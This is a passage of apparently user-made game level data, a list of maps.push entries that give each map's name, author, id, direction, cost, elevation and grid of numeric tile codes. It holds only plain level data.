1,1,1,25,25,65,1,1,1,126,126,1,55,55,56,57,58,59,59,59,59,59,3,25,25,65,0,0,1,49,49,1,55,55,56,57,58,59,59,59,59,59,3,25,25,65,0,0,1,49,49,1,1,1,1,1,1,1,1,1,1,1,1,25,25,65,0,0,1,49,49,1,0,0,0,0,0,0,0,0,0,0,1,25,25,65,0,0,1,49,49,1,0,0,0,0,0,0,0,0,0,0,1,25,25,65,0,0,1,49,49,1,1,1,1,1,1,1,1,1,1,1,1,25,25,65,0,0,1,49,49,49,50,51,52,53,54,54,54,54,54,54,3,25,25,65,0,0,1,49,49,49,50,51,52,53,54,54,54,54,54,54,3,25,25,65]});
maps.push({name="BlackMold",author="MoistNoodlez",id="#1658366130",direction="forward",cost=646,elevation=0,map=[1,2,2,10,10,10,10,10,10,96,10,101,101,101,96,10,10,10,10,1,1,10,10,10,10,10,10,10,10,96,99,101,104,101,96,10,10,10,10,1,1,10,10,10,10,10,10,10,10,96,10,101,10,101,96,10,10,10,10,1,1,10,10,10,10,10,10,10,10,96,10,101,101,101,96,10,10,10,10,1,1,10,10,10,10,10,10,10,10,96,96,96,96,96,96,10,70,70,70,1,1,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,70,70,70,1,1,96,96,96,10,10,10,10,10,10,10,10,10,10,10,10,70,70,10,97,1,98,98,96,10,10,10,10,10,10,10,10,10,10,10,10,70,70,70,1,102,10,98,96,10,10,10,10,10,10,10,10,10,10,10,10,70,70,70,1,1,98,98,96,96,96,96,96,96,96,96,96,96,96,96,96,96,96,96,1,1,96,96,96,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,1,1,10,88,10,10,88,10,10,88,10,10,88,10,10,88,10,10,88,10,1,1,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,1,1,98,98,98,98,98,98,98,98,98,98,98,98,98,98,98,98,98,98,1,1,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,1,1,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,1,1,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,1,1,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,1,1,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,1,1,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,2,2,1]});
maps.push({name="LavaHopscotch",author="MoistNoodlez",id="#1658371027",direction="forward",cost=653,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,14,14,14,14,14,14,1,1,14,14,14,14,14,14,14,14,14,14,14,1,14,1,14,1,14,14,1,1,76,76,76,76,76,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,76,76,76,76,76,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,76,76,76,76,76,76,14,76,76,1,14,1,14,1,14,1,14,14,1,1,76,76,76,14,76,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,14,76,76,76,76,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,76,76,76,76,76,76,14,76,76,1,14,1,14,1,14,1,14,14,1,1,76,76,14,76,76,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,76,76,76,76,14,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,14,76,76,76,76,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,97,14,76,76,76,76,14,76,76,1,14,1,14,1,14,1,14,14,1,1,14,76,76,76,76,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,76,76,76,14,14,76,76,76,76,1,14,1,14,1,14,1,14,14,1,1,76,76,76,76,76,76,76,76,76,1,14,14,14,14,14,1,14,14,1,1,76,76,76,76,76,76,14,76,76,1,0,0,0,0,0,1,14,14,1,1,76,76,76,76,76,76,76,76,76,1,0,0,0,0,0,1,14,14,1,1,76,76,76,9,9,76,76,76,76,1,0,0,0,0,0,0,14,14,1,1,96,96,14,3,3,14,14,14,14,14,14,14,14,14,95,14,14,14,1,1,2,2,96,14,14,14,14,14,14,14,14,14,14,14,95,14,14,14,1]});
maps.push({name="Clamber",author="tilgep",id="#1658412073",direction="left",cost=212,elevation=18,map=[0,0,0,0,0,12,12,12,12,1,0,0,0,0,6,2,2,6,0,0,0,0,0,0,12,12,12,12,12,9,9,9,9,6,6,6,6,6,0,0,0,0,0,12,12,12,12,12,12,4,9,9,9,4,6,6,6,6,0,0,0,0,12,12,12,12,12,12,12,9,9,9,9,6,6,6,6,6,0,0,0,0,12,12,12,12,12,12,12,1,0,0,1,0,6,4,6,0,0,0,0,1,12,4,12,4,12,0,1,0,0,0,0,1,9,9,9,0,0,0,0,1,16,16,16,16,16,1,0,0,0,0,0,0,9,9,9,0,0,0,0,0,16,16,16,16,16,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,16,16,16,16,16,0,0,0,0,0,0,1,9,4,9,1,0,0,0,0,16,16,125,16,16,0,1,0,0,0,1,12,12,12,12,12,1,0,0,0,0,0,0,0,0,1,0,0,0,1,0,12,12,12,12,12,0,0,0,0,0,0,0,0,1,0,16,16,16,16,12,12,12,12,12,12,0,0,0,0,24,24,24,24,0,0,16,16,16,16,4,12,12,12,12,12,0,0,0,0,24,24,24,24,0,0,125,16,16,16,12,12,12,12,12,0,0,0,0,0,24,24,24,24,0,0,16,16,16,16,4,12,12,12,0,0,0,0,2,24,24,24,24,24,0,0,16,16,16,16,12,12,12,0,0,0,0,0,2,24,24,24,24,24,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Get The Buttons",author="Block",id="#1658413887",direction="left",cost=372,elevation=16,map=[131,21,21,103,135,135,135,135,135,0,1,13,132,1,13,13,5,5,2,2,21,21,21,103,135,135,135,135,135,0,1,13,13,1,97,13,5,5,5,5,21,21,21,103,135,135,135,135,135,0,1,13,13,1,13,13,5,5,5,5,2,21,21,0,0,0,135,135,135,0,1,13,13,1,13,13,5,5,5,5,2,21,21,0,0,0,135,135,135,0,1,93,13,1,13,13,5,5,5,5,21,21,21,0,0,0,135,135,135,0,1,94,13,1,13,13,95,95,95,95,134,21,21,0,0,0,21,21,21,0,1,13,13,1,13,13,5,5,5,5,1,1,1,0,0,0,21,102,21,0,1,100,13,1,13,13,5,125,125,125,0,0,0,0,0,0,95,95,95,0,1,133,13,1,13,13,13,13,13,13,0,0,0,0,0,0,21,21,21,0,1,13,13,1,13,13,13,127,127,127,104,16,0,0,0,0,21,21,21,0,1,13,13,1,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,16,16,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,126,16,16,0,1,20,98,126,126,126,98,0,0,0,0,16,96,16,16,16,16,16,16,0,1,20,20,98,98,98,20,0,0,0,0,128,96,16,16,16,16,16,125,0,0,101,20,20,20,20,20,0,0,0,0,128,96,16,16,16,16,16,125,0,0,101,20,20,20,20,20,0,0,0,0,128,96,16,16,16,16,16,16,0,1,20,20,20,20,20,20,0,0,0,0,16,96,16,16,16,99]});
maps.push({name="Jump King",author="tilgep",id="#1658415547",direction="forward",cost=117,elevation=-5,map=[0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,1,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,1,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,5,5,22,22,22,0,0,0,0,19,19,19,19,19,19,3,5,5,5,5,5,4,22,100,22,0,0,0,0,0,19,2,2,19,19,0,0,0,0,0,5,5,22,22,22,0]});
maps.push({name="Is it worth it",author="tilgep",id="#1658416127",direction="forward",cost=203,elevation=-2,map=[0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,66,66,14,76,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,69,69,1,79,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,69,69,1,79,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,69,69,1,79,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,69,69,1,76,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,66,66,1,14,14,14,97,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,0,0,15,15,15,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,1,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,96,96,96,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,96,14,94,14,96,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,96,93,14,93,96,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,96,14,94,14,96,14,12,12,12,12,0,0,0,0,0,0,0,0,0,0,14,96,96,96,14,14,12,12,12,12,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,12,2,2,12,0,0,0,0]});
maps.push({name="Crossing",author="tilgep",id="#1658419211",direction="forward",cost=168,elevation=-1,map=[0,0,17,17,17,17,17,17,2,2,17,17,17,17,17,17,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,92,0,92,0,92,0,92,92,0,92,0,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,0,92,0,92,0,92,0,0,92,0,92,0,92,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,16,16,16,16,16,16,16,16,16,16,16,16,16,16,0,0,0,0,0,0,16,16,16,16,16,16,2,2,16,16,16,16,16,16,0,0,0,0]});
maps.push({name="Arrow",author="tilgep",id="#1658420434",direction="forward",cost=37,elevation=-13,map=[0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,0,44,0,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42,0,42,0,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,40,0,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,0,38,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,0,36,0,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,0,34,0,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,0,32,0,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0]});
maps.push({name="Corridor",author="tilgep",id="#1658423000",direction="forward",cost=133,elevation=0,map=[0,0,0,0,24,57,2,2,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,24,24,57,57,57,57,57,24,24,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,57,57,57,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,57,2,2,57,24,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Make a Splash",author="tilgep",id="#1658424801",direction="right",cost=356,elevation=-10,map=[0,0,0,124,2,2,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,124,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,44,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,44,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,44,0,0,0,0,0,5,5,3,14,66,66,14,14,14,0,0,0,5,5,5,5,5,5,5,5,5,66,67,66,66,66,66,14,2,0,0,5,5,66,66,66,66,66,66,66,66,66,67,66,66,66,66,14,2,0,67,73,66,66,66,66,66,66,66,66,66,66,67,66,66,66,66,14,14,0,67,73,66,66,66,66,66,66,66,66,66,66,67,66,66,66,66,14,14,0,67,73,66,66,66,66,66,66,66,66,66,66,67,66,66,66,66,66,14,0,67,73,66,66,66,66,66,66,66,66,66,66,67,66,66,66,66,66,14,0,67,73,66,66,66,66,66,66,66,66,66,66,67,66,66,66,66,66,14,0,0,5,5,5,5,5,5,5,5,5,5,5,14,66,66,66,66,66,14,0,0,0,0,0,5,5,5,0,0,0,0,0,14,14,66,66,14,14,14,0,0,0,0,0,0,0,26,27,28,29,30,31,32,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Go Go GO",author="tilgep",id="#1658424976",direction="forward",cost=60,elevation=0,map=[0,0,0,0,0,0,17,2,2,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,127,127,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,2,2,17,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Just go straight",author="MacBlub",id="#1658429825",direction="left",cost=318,elevation=-19,map=[34,34,34,135,135,135,0,135,24,2,2,24,135,0,135,135,135,34,34,34,34,94,34,135,135,135,0,135,24,24,24,24,135,0,135,135,135,34,93,34,34,34,34,135,135,135,0,0,135,135,135,135,0,0,135,135,135,34,34,34,0,34,34,135,135,135,135,0,0,0,0,0,0,135,135,135,135,34,34,0,0,34,34,135,135,135,135,135,135,135,135,135,135,135,135,135,135,34,34,0,0,34,34,135,135,135,135,135,135,135,135,135,135,135,135,135,135,34,34,0,0,34,34,135,135,135,135,135,135,135,135,135,135,135,135,135,135,34,34,0,0,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,0,0,34,33,33,32,31,30,29,28,28,28,28,29,30,31,32,33,33,34,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,2,25,95,95,25,26,27,27,28,28,28,28,0,0,0,0,0,0,0,0,2,25,95,95,25,26,27,27,28,28,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="HighwayToHeaven",author="MoistNoodlez",id="#1658454642",direction="forward",cost=420,elevation=0,map=[12,12,12,12,14,14,14,14,14,2,2,14,14,14,14,14,12,12,12,12,10,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,10,10,0,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,0,10,10,0,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,0,10,10,0,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,0,10,10,10,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,10,10,10,10,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,10,10,10,10,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,10,10,8,8,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,8,8,8,8,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,8,8,8,8,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,8,8,8,8,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,8,8,8,8,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,8,8,10,10,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,10,10,91,91,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,91,91,91,91,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,91,91,10,10,0,0,0,0,0,75,75,75,75,75,75,0,0,0,0,0,10,10,10,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,10,10,0,0,0,14,14,14,14,95,95,95,95,14,14,0,0,0,0,0,10,12,12,12,12,14,14,14,14,95,2,2,95,14,14,14,14,12,12,12,12]});
maps.push({name="SwimBitch",author="MoistNoodlez",id="#1658455201",direction="forward",cost=634,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,1,66,66,66,14,14,1,14,129,66,66,66,66,66,66,66,1,1,127,127,1,66,66,66,66,66,1,14,129,66,66,66,66,66,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,66,66,66,66,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,1,66,66,1,1,66,66,1,66,66,1,66,66,1,66,66,66,1,66,66,66,66,66,1,1,66,66,66,66,66,1,66,66,66,66,66,14,1,66,66,66,66,66,1,1,14,14,14,14,14,1,66,66,66,66,14,14,1,14,14,14,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1]});
maps.push({name="HighwayToHell",author="MoistNoodlez",id="#1658456264",direction="right",cost=708,elevation=0,map=[1,14,2,2,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,75,75,14,1,14,14,14,14,14,14,14,14,14,14,14,1,14,1,1,14,75,75,14,1,14,75,75,75,75,75,75,75,75,75,14,1,132,1,1,14,75,75,14,1,14,75,75,75,75,75,75,75,75,75,14,1,14,1,1,14,75,75,14,1,14,75,75,75,75,75,75,75,75,75,14,1,14,1,1,14,75,75,14,1,14,75,75,14,14,14,75,75,75,75,14,1,95,2,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,14,1,95,2,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,14,1,14,1,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,14,1,14,1,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,14,1,132,1,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,14,1,14,1,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,14,1,1,1,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,14,1,93,94,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,14,1,14,14,1,14,75,75,14,1,14,75,75,14,1,14,75,75,75,75,76,14,76,1,1,14,75,75,14,14,14,75,75,14,1,14,75,75,75,75,14,131,14,1,1,14,75,75,75,75,75,75,75,14,1,14,75,75,75,75,14,131,14,1,1,14,75,75,75,75,75,75,75,14,1,14,75,75,75,75,76,14,76,1,1,14,14,14,14,14,14,14,14,14,1,14,14,14,14,14,14,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Chill Fountain",author="Squidward",id="#1658461820",direction="forward",cost=284,elevation=10,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,34,0,0,0,0,0,0,0,0,0,8,3,5,0,0,0,12,0,33,0,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,36,0,0,0,0,0,9,0,0,0,0,0,0,16,0,0,0,0,0,0,38,0,0,0,0,0,3,0,0,0,0,0,18,0,0,0,20,67,20,0,0,0,0,0,0,0,14,0,0,0,20,20,20,20,90,0,20,66,20,0,0,0,0,0,0,0,0,0,0,0,20,66,66,66,20,20,20,66,20,20,0,0,0,0,0,0,0,0,20,67,20,66,66,66,66,66,66,66,65,20,0,0,0,0,0,0,15,3,20,65,65,66,66,65,66,66,66,66,65,20,0,0,0,0,0,0,0,0,90,65,66,65,65,65,65,20,66,20,65,20,0,0,0,0,0,0,0,20,20,66,66,90,20,20,65,66,66,90,20,0,0,0,0,0,0,0,0,20,66,66,65,20,93,20,65,65,66,20,20,0,0,0,0,0,0,0,0,20,20,66,65,20,20,20,66,66,66,66,20,20,0,0,0,0,0,0,0,0,67,66,65,65,66,65,65,66,66,66,66,67,0,0,0,24,4,20,0,92,20,66,66,66,66,66,66,66,66,66,66,67,0,0,0,92,0,0,0,0,20,66,66,66,66,66,90,20,66,20,20,20,0,0,0,0,0,0,0,0,20,67,67,20,65,65,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,0,0,0,0,0,0,0,0,24,92,0,0,0,24,100,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="RatEscape",author="MoistNoodlez",id="#1658530813",direction="forward",cost=257,elevation=0,map=[0,0,0,0,0,1,1,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,1,76,76,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,76,76,14,14,14,1,1,1,14,1,0,0,0,0,0,0,0,0,1,1,14,14,14,14,14,1,132,1,14,1,1,0,0,0,0,0,0,0,1,1,14,14,14,76,76,1,127,1,14,14,1,0,0,0,0,0,0,0,1,1,14,14,14,76,76,1,14,14,1,14,1,0,0,0,0,0,0,0,1,14,14,14,14,14,14,1,14,14,1,14,1,0,0,0,0,0,0,0,1,14,14,14,14,14,14,1,1,14,14,14,1,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,1,14,14,14,1,0,0,0,0,0,0,0,1,1,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,1,1,14,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,1,1,14,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,1,1,14,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,14,14,14,14,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,1,9,1,1,1,1,1,1,91,91,91,91,1,0,0,0,0,0,0,1,9,100,5,131,5,14,14,14,91,91,2,2,1,0,0,0,0,0]});
